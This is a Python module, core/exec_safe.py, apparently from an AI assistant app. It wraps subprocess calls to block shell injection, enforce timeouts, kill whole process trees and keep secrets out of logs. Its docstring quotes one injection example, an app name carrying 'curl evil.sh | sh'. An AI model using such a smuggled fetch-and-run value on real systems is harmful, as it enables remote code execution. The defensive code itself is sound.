"""
core/exec_safe.py — the only way this app should start an external program.

THE THREE FAULTS THIS REPLACES
    SHELL INJECTION. `actions/open_app.py` does

        subprocess.Popen(app_name, shell=True, ...)
        subprocess.Popen(f"start {app_name}", shell=True)

    where `app_name` is free text the model wrote. "Spotify" works; so does
    "Spotify & curl evil.sh | sh". `actions/dev_agent.py` has a subtler version:
    a *list* passed with `shell=True`, which on POSIX runs `code` and silently
    discards the project path — a bug and a hazard in one line.

    NO TIMEOUT. `pip show` in `actions/dev_agent.py:249` and both calls in
    `core/installer.py` have none. A hung child hangs the executor thread that
    started it, for as long as the machine stays up.

    ORPHANS. `subprocess.run(timeout=...)` kills the child it started and
    nothing that child started. `pip install` spawning a compiler, killed on
    timeout, leaves the compiler running.

WHAT THIS GIVES INSTEAD
    - argv lists only. There is no parameter that would let a caller pass a
      command string, and `shell=` is rejected by name with an explanation.
    - `timeout` is keyword-only and has no default, so "I forgot" is a
      TypeError at the call site rather than a hang in production.
    - the child gets its own process group / session, and a timeout kills the
      whole group: TERM, a grace period, then KILL. On Windows, `taskkill /T`.
    - output is capped in bytes as well as in time, so a program that floods
      stdout cannot take the assistant's memory with it.
    - a non-zero exit is reported as a non-zero exit. It is not an exception,
      it is not a `True`, and it is not swallowed — `ok` is False and the
      caller has the code and the stderr to say why.

WHAT IT DELIBERATELY DOES NOT DO
    It does not decide whether a command is *allowed*. That is
    `core/permissions.py`, and keeping the two apart is the point: this module
    is about running a program correctly, that one is about whether a human
    agreed to it. A caller that skips the broker and calls `run()` directly has
    a safe subprocess, not an authorised one.

    It does not sanitise arguments. With `shell=False` there is no shell to
    sanitise for; argv elements reach the program as separate strings and are
    never re-parsed. What it does refuse is the *shape* that makes sanitising
    necessary in the first place.

SECRETS
    Nothing here prints. `ExecResult` carries the program's basename and never
    the argv, because argv is where API keys and tokens ride — `--token=...`,
    `pip install --index-url https://user:pass@host`. Callers logging a result
    therefore cannot leak an argument by accident; see `core/audit.py`, which
    accepts only `result.program`.
"""

from __future__ import annotations

import os
import shutil
import signal
import subprocess
import sys
import threading
import time
from dataclasses import dataclass
from pathlib import Path

# A command that has not finished in an hour is not going to. This is a
# backstop against a caller passing timeout=None-by-way-of-a-huge-number, not a
# recommendation — real call sites use seconds to low minutes.
MAX_TIMEOUT_SECONDS = 3600.0

# How long a process group gets to die politely after SIGTERM before SIGKILL.
KILL_GRACE_SECONDS = 3.0

# Per-stream cap. Beyond this the child keeps running and its output keeps being
# drained (so it never blocks on a full pipe) but stops being kept.
DEFAULT_MAX_OUTPUT_BYTES = 1024 * 1024

_IS_WINDOWS = os.name == "nt"

# Handles for processes started by spawn(). Nothing waits on those by design —
# the launched application is meant to outlive the call — but on POSIX an
# un-waited child stays in the process table as a zombie until its parent exits,
# and a long assistant session launching apps all day accumulates them. Holding
# the handles and polling them on the next spawn reaps each one shortly after it
# exits, at the cost of one poll per launch.
_spawned: "list[subprocess.Popen]" = []
_spawned_lock = threading.Lock()

# A ceiling so a wedged process that never exits cannot make this list grow
# without bound. Oldest handles are dropped; dropping one only means the OS
# reaps it later than it could have, never that anything leaks.
_MAX_TRACKED_SPAWNS = 64


class UnsafeCommand(ValueError):
    """The call itself was malformed in a way that would have been dangerous:
    a command string instead of an argv list, a `shell=` argument, an empty
    program, or a missing/invalid timeout."""


@dataclass(frozen=True)
class ExecResult:
    """What happened. Every field is safe to log except `stdout`/`stderr`,
    which are the program's own output and belong to the caller."""

    program: str
    """Basename of argv[0] — 'ffmpeg', 'pip'. Never the full argv."""

    ok: bool
    """True only when the process ran to completion and exited 0."""

    returncode: int | None
    """None when the process never produced one (spawn failure, or killed on
    timeout before reporting)."""

    stdout: str = ""
    stderr: str = ""

    timed_out: bool = False
    killed: bool = False
    """True when this module had to terminate the process group."""

    truncated: bool = False
    """Output exceeded the byte cap and was cut."""

    error: str = ""
    """Empty for any process that started and exited, *including* a non-zero
    exit — that is a result, not an error. Non-empty when the program could not
    be started at all, or was killed: 'FileNotFoundError',
    'PermissionError', 'timeout'."""

    duration_ms: int = 0
    argv_len: int = 0
    """How many arguments there were. The count is useful for debugging; the
    contents are not logged."""

    def summary(self) -> str:
        """One line for a human or the model. Contains no argument values."""
        if self.timed_out:
            return f"{self.program}: timed out after {self.duration_ms / 1000:.1f}s and was stopped."
        if self.error:
            return f"{self.program}: could not run ({self.error})."
        if self.ok:
            return f"{self.program}: finished successfully."
        return f"{self.program}: exited with code {self.returncode}."

    def failure_detail(self, limit: int = 300) -> str:
        """Why it failed, for a message back to the user. Prefers stderr, falls
        back to stdout, and is empty on success."""
        if self.ok:
            return ""
        text = (self.stderr or self.stdout or "").strip()
        if len(text) > limit:
            text = text[:limit].rstrip() + "…"
        return text


# ── Validation ───────────────────────────────────────────────────────────────

def _validate_argv(argv) -> list[str]:
    if isinstance(argv, (str, bytes)):
        raise UnsafeCommand(
            "A command string is not accepted — pass a list of arguments, e.g. "
            "['ffmpeg', '-i', path]. Strings would need a shell to split them, "
            "and this app does not start shells."
        )
    try:
        items = list(argv)
    except TypeError:
        raise UnsafeCommand("argv must be a list of arguments.")

    if not items:
        raise UnsafeCommand("argv is empty — there is no program to run.")

    out: list[str] = []
    for item in items:
        if isinstance(item, (bytes, bytearray)):
            raise UnsafeCommand("argv entries must be text, not bytes.")
        if isinstance(item, Path):
            out.append(str(item))
            continue
        if not isinstance(item, str):
            # int/float/None here is always a caller bug, and str()-ing it
            # silently is how a None becomes the literal argument "None".
            raise UnsafeCommand(
                f"argv entry {len(out)} is a {type(item).__name__}, not a string."
            )
        if "\x00" in item:
            raise UnsafeCommand("argv entries must not contain null bytes.")
        out.append(item)

    if not out[0].strip():
        raise UnsafeCommand("The program name is empty.")
    return out


def _validate_timeout(timeout) -> float:
    if timeout is None:
        raise UnsafeCommand(
            "timeout is required. Every external program this app starts must "
            "have a deadline."
        )
    try:
        value = float(timeout)
    except (TypeError, ValueError):
        raise UnsafeCommand("timeout must be a number of seconds.")
    if value != value or value <= 0:          # NaN or non-positive
        raise UnsafeCommand("timeout must be greater than zero.")
    return min(value, MAX_TIMEOUT_SECONDS)


# ── Killing things properly ──────────────────────────────────────────────────

def _terminate_tree(proc: subprocess.Popen) -> None:
    """Stop `proc` and everything it started.

    POSIX: the child was given its own session, so its pid doubles as a process
    group id and one `killpg` reaches every descendant that did not deliberately
    leave the group.

    Windows: `taskkill /T` walks the parent/child tree. `Popen.kill()` there
    terminates only the immediate child, which is what leaves orphans behind.
    The argv is a fixed literal plus a pid, so there is nothing to inject."""
    if proc.poll() is not None:
        return

    if _IS_WINDOWS:
        try:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(proc.pid)],
                capture_output=True, timeout=KILL_GRACE_SECONDS,
            )
        except Exception:
            pass
        try:
            proc.kill()
        except Exception:
            pass
        return

    def _signal_group(sig) -> bool:
        try:
            os.killpg(os.getpgid(proc.pid), sig)
            return True
        except (ProcessLookupError, PermissionError, OSError):
            # Already gone, or never got its own group. Fall back to the child.
            try:
                proc.send_signal(sig)
                return True
            except Exception:
                return False

    _signal_group(signal.SIGTERM)
    deadline = time.monotonic() + KILL_GRACE_SECONDS
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return
        time.sleep(0.05)
    _signal_group(signal.SIGKILL)


# ── Bounded output ───────────────────────────────────────────────────────────

class _CappedReader(threading.Thread):
    """Drains a pipe, keeping at most `cap` bytes.

    It keeps *reading* after the cap so the child never blocks writing into a
    full pipe — a child blocked on write never exits, and a timeout would then
    be the only thing that ends it. Dropping the excess costs nothing and keeps
    a chatty program from taking the assistant's memory."""

    def __init__(self, stream, cap: int):
        super().__init__(daemon=True)
        self._stream = stream
        self._cap = cap
        self.data = bytearray()
        self.truncated = False

    def run(self):
        try:
            while True:
                chunk = self._stream.read(65536)
                if not chunk:
                    break
                room = self._cap - len(self.data)
                if room > 0:
                    self.data.extend(chunk[:room])
                if len(chunk) > max(room, 0):
                    self.truncated = True
        except Exception:
            # A closed or broken pipe while the process is being killed is
            # normal; whatever was collected so far is still returned.
            pass
        finally:
            try:
                self._stream.close()
            except Exception:
                pass


def _decode(raw: bytes) -> str:
    return raw.decode("utf-8", errors="replace")


# ── The one entry point ──────────────────────────────────────────────────────

def run(
    argv,
    *,
    timeout: float,
    cwd: "str | os.PathLike | None" = None,
    env: "dict[str, str] | None" = None,
    stdin_text: "str | None" = None,
    max_output_bytes: int = DEFAULT_MAX_OUTPUT_BYTES,
    **forbidden,
) -> ExecResult:
    """Run `argv` with a deadline and return what happened.

    Never raises for anything the *program* did — a missing binary, a crash, a
    non-zero exit and a timeout all come back as an `ExecResult` with `ok`
    False. It raises `UnsafeCommand` only for a malformed call: a command
    string, an empty argv, a missing timeout, or a `shell=` argument.

        r = exec_safe.run(["ffmpeg", "-i", str(src), str(dst)], timeout=600)
        if not r.ok:
            return f"Conversion failed. {r.failure_detail()}"

    `cwd` is passed through unvalidated on purpose: containment is
    `core/safe_path.py`'s job and callers that need it use it there, where the
    error message can say something useful about which folder was refused."""

    if forbidden:
        if "shell" in forbidden:
            raise UnsafeCommand(
                "shell= is not available here. A shell is what turns an argument "
                "into a command, which is exactly the step this module exists to "
                "remove. Pass the program and its arguments as separate list "
                "entries instead."
            )
        raise UnsafeCommand(
            f"Unsupported argument(s): {', '.join(sorted(forbidden))}."
        )

    args = _validate_argv(argv)
    limit = _validate_timeout(timeout)
    program = Path(args[0]).name or args[0]
    cap = max(0, int(max_output_bytes))

    popen_kwargs: dict = {
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "stdin":  subprocess.PIPE if stdin_text is not None else subprocess.DEVNULL,
        "cwd":    str(cwd) if cwd is not None else None,
        "env":    env,
        # Explicit and non-negotiable. Written out rather than omitted so that
        # anyone reading this can see it is False on purpose.
        "shell":  False,
    }

    if _IS_WINDOWS:
        # Its own group, so CTRL_BREAK/taskkill /T reach the whole tree.
        # main.py wraps Popen on Windows to OR in CREATE_NO_WINDOW; ORing here
        # rather than assigning keeps both flags.
        popen_kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
    else:
        # setsid: the child becomes a session leader, so its pid is a process
        # group id and killpg reaches its children too.
        popen_kwargs["start_new_session"] = True

    started = time.monotonic()

    try:
        proc = subprocess.Popen(args, **popen_kwargs)
    except FileNotFoundError:
        return ExecResult(
            program=program, ok=False, returncode=None,
            error="FileNotFoundError", argv_len=len(args),
            stderr=f"{program} is not installed or is not on the PATH.",
            duration_ms=int((time.monotonic() - started) * 1000),
        )
    except PermissionError:
        return ExecResult(
            program=program, ok=False, returncode=None,
            error="PermissionError", argv_len=len(args),
            stderr=f"Not allowed to run {program}.",
            duration_ms=int((time.monotonic() - started) * 1000),
        )
    except (OSError, ValueError) as e:
        return ExecResult(
            program=program, ok=False, returncode=None,
            error=type(e).__name__, argv_len=len(args),
            stderr=f"Could not start {program}.",
            duration_ms=int((time.monotonic() - started) * 1000),
        )

    out_reader = _CappedReader(proc.stdout, cap)
    err_reader = _CappedReader(proc.stderr, cap)
    out_reader.start()
    err_reader.start()

    if stdin_text is not None:
        try:
            proc.stdin.write(stdin_text.encode("utf-8", errors="replace"))
        except Exception:
            pass
    try:
        if proc.stdin:
            proc.stdin.close()
    except Exception:
        pass

    timed_out = False
    killed = False
    try:
        proc.wait(timeout=limit)
    except subprocess.TimeoutExpired:
        timed_out = True
        killed = True
        _terminate_tree(proc)
        try:
            proc.wait(timeout=KILL_GRACE_SECONDS)
        except subprocess.TimeoutExpired:
            # Unkillable (uninterruptible sleep, or a permission wall). Say so
            # rather than blocking this thread for the rest of the session.
            pass

    # The readers exit when their pipes close, which happens when the process
    # dies. A short join keeps a wedged reader from holding up the caller.
    out_reader.join(timeout=KILL_GRACE_SECONDS)
    err_reader.join(timeout=KILL_GRACE_SECONDS)

    duration_ms = int((time.monotonic() - started) * 1000)
    returncode = proc.poll()
    stdout = _decode(bytes(out_reader.data))
    stderr = _decode(bytes(err_reader.data))

    if timed_out:
        return ExecResult(
            program=program, ok=False, returncode=returncode,
            stdout=stdout, stderr=stderr,
            timed_out=True, killed=killed,
            truncated=out_reader.truncated or err_reader.truncated,
            error="timeout", duration_ms=duration_ms, argv_len=len(args),
        )

    return ExecResult(
        program=program,
        ok=(returncode == 0),
        returncode=returncode,
        stdout=stdout,
        stderr=stderr,
        timed_out=False,
        killed=False,
        truncated=out_reader.truncated or err_reader.truncated,
        error="",
        duration_ms=duration_ms,
        argv_len=len(args),
    )


def spawn(
    argv,
    *,
    cwd: "str | os.PathLike | None" = None,
    env: "dict[str, str] | None" = None,
    **forbidden,
) -> "tuple[bool, str]":
    """Start a program and do not wait for it — for launching an application,
    where the whole point is that it outlives the call.

    Returns `(started, detail)`. `started` means the process was created, which
    is emphatically not the same as "the app opened"; `actions/open_app.py`
    currently treats the two as identical and reports success for an `xdg-open`
    that failed. Callers that need to know the app really opened have to check
    for it afterwards, and this return value is deliberately named so that it
    does not invite the wrong claim.

    No timeout, because there is nothing to wait for — but also no pipes, so
    there is no way for the child to block on a full one."""
    if forbidden:
        if "shell" in forbidden:
            raise UnsafeCommand("shell= is not available here — pass an argv list.")
        raise UnsafeCommand(f"Unsupported argument(s): {', '.join(sorted(forbidden))}.")

    args = _validate_argv(argv)
    program = Path(args[0]).name or args[0]

    kwargs: dict = {
        "stdout": subprocess.DEVNULL,
        "stderr": subprocess.DEVNULL,
        "stdin":  subprocess.DEVNULL,
        "cwd":    str(cwd) if cwd is not None else None,
        "env":    env,
        "shell":  False,
    }
    if _IS_WINDOWS:
        kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
    else:
        kwargs["start_new_session"] = True

    reap()

    try:
        _track(subprocess.Popen(args, **kwargs))
        return True, f"{program} started."
    except FileNotFoundError:
        return False, f"{program} is not installed or is not on the PATH."
    except PermissionError:
        return False, f"Not allowed to run {program}."
    except (OSError, ValueError) as e:
        return False, f"Could not start {program} ({type(e).__name__})."


def _track(proc: subprocess.Popen) -> None:
    """Remember a spawned process so `reap()` can collect it when it exits."""
    with _spawned_lock:
        _spawned.append(proc)
        while len(_spawned) > _MAX_TRACKED_SPAWNS:
            _spawned.pop(0)


def reap() -> int:
    """Collect any spawned processes that have since exited. Returns how many.

    Called automatically on each `spawn()`, and worth calling from a shutdown
    path. Never blocks: `poll()` only asks, it does not wait."""
    collected = 0
    with _spawned_lock:
        still_running = []
        for proc in _spawned:
            try:
                if proc.poll() is None:
                    still_running.append(proc)
                else:
                    collected += 1
            except Exception:
                collected += 1
        _spawned[:] = still_running
    return collected


def resolve_program(name: str) -> "str | None":
    """Absolute path of `name` on the PATH, or None.

    A thin wrapper over `shutil.which` that exists so call sites can check for a
    program before offering to run it, and so the absolute path — rather than a
    bare name resolved at exec time against whatever PATH happens to be — is
    what ends up in argv."""
    if not isinstance(name, str) or not name.strip():
        return None
    try:
        return shutil.which(name)
    except Exception:
        return None


def python_executable() -> str:
    """This interpreter, for running Python as a child process.

    `sys.executable`, never the string "python": `actions/file_processor.py`
    runs `["python", path]`, which on a machine where `python` is Python 2, or
    absent, or a different virtualenv, runs something other than the interpreter
    the assistant is using."""
    return sys.executable or "python3"


__all__ = [
    "ExecResult", "UnsafeCommand",
    "run", "spawn", "reap", "resolve_program", "python_executable",
    "MAX_TIMEOUT_SECONDS", "DEFAULT_MAX_OUTPUT_BYTES",
]
